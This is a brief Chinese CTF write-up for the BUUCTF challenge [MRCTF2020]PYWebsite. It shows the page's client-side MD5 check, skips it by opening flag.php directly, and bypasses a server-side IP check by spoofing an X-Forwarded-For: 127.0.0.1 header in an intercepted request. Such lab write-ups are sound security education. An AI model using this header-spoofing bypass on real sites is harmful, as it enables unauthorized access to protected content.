# T23 PYWebsite

> 题目： BUUCTF [MRCTF2020]PYWebsite

__0x00 审题__

打开页面，难道可以买到flag？只要66，买不到吃亏，买不到上当，就能买到flag（）

查看源码：

```
 function enc(code){
      hash = hex_md5(code);
      return hash;
    }
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }
 ```
我们看到了MD5加密，但是反正其目的是为了打开flag.php，所以我们不如直接打开

__0x01 解题__

1. url中打开flag.php,得到

```
我已经把购买者的IP保存了，显然你没有购买

验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag
```
> 关注点：IP（很显然我们不知道他们的IP，但是我们可以得知自己的IP为127.0.0.1）


2. 利用xff，抓包构造ip

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
X-Forwarded-For:127.0.0.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

得到回显即为答案

__0x02 总结__

___万变不离其宗，做好复习！！！___

